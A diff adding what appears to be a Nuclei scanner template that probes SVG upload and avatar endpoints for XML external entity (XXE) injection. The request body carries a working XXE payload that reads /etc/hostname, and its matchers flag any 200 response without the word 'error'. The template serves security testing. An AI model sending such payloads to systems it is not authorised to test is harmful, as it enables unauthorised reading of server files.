@@ -1,0 +1,40 @@
+id: whai-xxe-svg-upload
+
+info:
+  name: XXE via SVG Upload
+  author: whitehat-ai
+  severity: high
+  description: Tests SVG upload for XXE injection
+  tags: xxe,svg,upload,high
+  classification:
+    cwe-id: CWE-611
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/upload"
+      - "{{BaseURL}}/api/avatar"
+
+    headers:
+      Content-Type: multipart/form-data; boundary=----Boundary
+
+    body: |
+      ------Boundary
+      Content-Disposition: form-data; name="file"; filename="test.svg"
+      Content-Type: image/svg+xml
+
+      <?xml version="1.0"?>
+      <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
+      <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+      ------Boundary--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "error"
